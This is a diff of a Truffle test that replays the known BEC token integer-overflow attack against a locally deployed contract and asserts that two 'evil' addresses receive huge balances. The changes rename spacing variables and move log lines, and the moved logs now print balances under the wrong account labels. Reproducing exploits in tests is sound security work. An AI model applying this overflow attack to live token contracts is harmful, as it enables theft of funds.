@@ -15,8 +15,8 @@ var BecToken = artifacts.require('BecToken.sol');
  * uint256表示数据范围：0 ~ 2^256-1，即0x00-0xFF...FF (32对FF)
  */
 let STR0X = "0x";
-let SP10 = "          ";
-let SP8 = "        ";
+let SPLong = "          ";
+let SPMid = "     ";
 
 let evilAccounts0 = "0000000000000000000000000000000000000001"; // 恶意地址1
 let evilAccounts1 = "0000000000000000000000000000000000000002"; // 恶意地址2
@@ -36,13 +36,13 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
             from: owner
         });
         seq++;
-        console.log(SP8, "Case:", seq, "New contract address:", token.address);
+        console.log(SPMid, "Case:", seq, "New contract address:", token.address);
     });
 
     it('Case @ should have correct information', async function () {
-        console.log(SP10, 'Owner:', owner);
-        console.log(SP10, "Evil Address 1", STR0X + evilAccounts0);
-        console.log(SP10, "Evil Address 2", STR0X + evilAccounts1);
+        console.log(SPLong, 'Owner:', owner);
+        console.log(SPLong, "Evil Address 1", STR0X + evilAccounts0);
+        console.log(SPLong, "Evil Address 2", STR0X + evilAccounts1);
 
         const decimals = await token.decimals();
         const name = await token.name();
@@ -58,6 +58,7 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
         assert.equal(ret.valueOf(), 0, "检查攻击前账户0的余额");
         
         ret = await token.balanceOf(STR0X + evilAccounts1);
+        console.log(SPLong, "balanceOf(", STR0X + evilAccounts0, ").toFix(0)    ", ret.toFixed(0));
         assert.equal(ret.valueOf(), 0, "检查攻击前账户1的余额");
 
         /// @dev 开始实施溢出攻击
@@ -65,6 +66,8 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
             from: owner
         });
         ret = await token.balanceOf(STR0X + evilAccounts0);
+        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
+        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
         ret.should.be.bignumber.equal(evilNumber); // 校验攻击后余额
     });
 
@@ -98,16 +101,13 @@ contract('BEC-Token溢出漏洞重放', function ([owner]) {
             to: token.address,
             data: data
         });
-        console.log(SP10, "TxHash:", result);
+        console.log(SPLong, "TxHash:", result);
 
 
-        ret = await token.balanceOf(STR0X + evilAccounts0);
-        console.log(SP10, "balanceOf(", STR0X + evilAccounts0, ").toFix(0)    ", ret.toFixed(0));        
+        ret = await token.balanceOf(STR0X + evilAccounts0);   
         ret.should.be.bignumber.equal(evilNumber); // 校验攻击后账户0的余额
 
         ret = await token.balanceOf(STR0X + evilAccounts1); // bec的类型为BigNumber
-        console.log(SP10, "balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
-        console.log(SP10, "balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
         ret.should.be.bignumber.equal(evilNumber); // 校验攻击后账户1余额
     });
 });
